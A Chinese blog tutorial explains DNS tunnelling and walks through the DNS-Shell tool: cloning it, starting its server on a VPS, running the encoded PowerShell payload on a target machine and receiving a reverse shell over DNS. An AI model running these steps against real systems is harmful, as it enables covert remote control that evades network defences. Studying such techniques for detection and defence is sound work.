**目录**

[DNS隧道](#t0 "DNS隧道")

[利用DNS进行命令控制(DNS-Shell)](#t1 "利用DNS进行命令控制(DNS-Shell)")

[DNS-Shell的使用](#t2 "DNS-Shell的使用")

* * *

DNS隧道
=====

DNS协议是一种请求、应答协议，也是一种可用于应用层的隧道技术。DNS隧道的工作原理很简单，在进行DNS查询时，如果查询的域名不在DNS服务器本机缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交互。从DNS协议的角度来看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上返回的可以是任意的字符串，包括加密的C&C指令。

在使用DNS隧道与外部进行通信时，从表面上看是没有连接外网的(内网网关没有转发IP数据包)。但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。

利用DNS进行命令控制(DNS-Shell)
----------------------

DNS-Shell是一款通过DNS[信道](https://so.csdn.net/so/search?q=%E4%BF%A1%E9%81%93&spm=1001.2101.3001.7020)实现交互式Shell的强大工具，该工具的服务器端基于Python开发，可以任何一种安装了Python环境的操作系统平台上运行，工具所使用的Payload均已PowerShell命令进行编码，保证了在不同平台间运行的稳定性和兼容性。

**DNS-Shell运行机制**

该工具所使用的Payload会在服务器端脚本被调用时自动生成，Payload会使用nslookup来向服务器端查询和请求新的操作命令，接下来服务器端会监听端口53并等待传入的连接。当Payload在目标设备上成功执行后，服务器端将会生成一个交互式Shell并提供给用户进行操作。

通信信道建立成功后，Payload会继续向服务器查询和请求新的操作指令，当攻击者在服务器端输入新的操作命令后，Payload将会收到命令并执行该命令，然后在命令执行成功后将执行结果返回给服务器端。

### **DNS-Shell的使用**

DNS-Shell的运行相对来说比较简单，DNS-Shell支持两种操作模式，即 直接操作模式 和 递归模式：

**下载DNS-Shell：**

```
git clone https://github.com/sensepost/DNS-Shell.git
```


**DNS-Shell直接模式：**

```
python2 DNS-Shell.py -l -d VPS的IP
```


该命令会生成一段payload

![](https://img-blog.csdnimg.cn/20200220175024922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们将该payload复制，在目标机cmd窗口中执行 

```
powershell.exe -e 生成的payload
```


![](https://img-blog.csdnimg.cn/20200220175047404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，我们已经成功接收到反弹回来的shell了

![](https://img-blog.csdnimg.cn/20200220175135438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg) 

参考文章：[利用DNS隧道构建隐蔽C&C信道](https://mp.weixin.qq.com/s/9reEmnVKOwBOCVV1gwLczg "利用DNS隧道构建隐蔽C&C信道")

                  [DNS-Shell：一款通过DNS信道来实现交互式Shell的强大工具](https://www.freebuf.com/sectool/198686.html "DNS-Shell：一款通过DNS信道来实现交互式Shell的强大工具")

                  [DNS Shell 一款控制服务器的工具](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650455164&idx=4&sn=9b247838a7291949ee1e974646512bf7&chksm=83bbd998b4cc508eddb26f20dbe1bee0dc97c637265ae54495a4a1287e37c48360795ce60da1&scene=0&xtrack=1&key=2e27ce8b4f8ddf520658a5c8651174f11d2db22c6250ba2d31d6cba8fa297d91f0d3377a5b1177483055a5e99e7c2d697a4d58fa63c5e8f1c903f2148d8be1274de82117022bab884f3e6757a5e79d8a&ascene=14&uin=MjIwMDQzNjQxOQ%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=0h6HqaWCJvhAQAnVlT6sJN9DzDfdfzQBnP1cucUdKA7EvsGPNqyVpXQ%2B6QzRWi26 "DNS Shell 一款控制服务器的工具")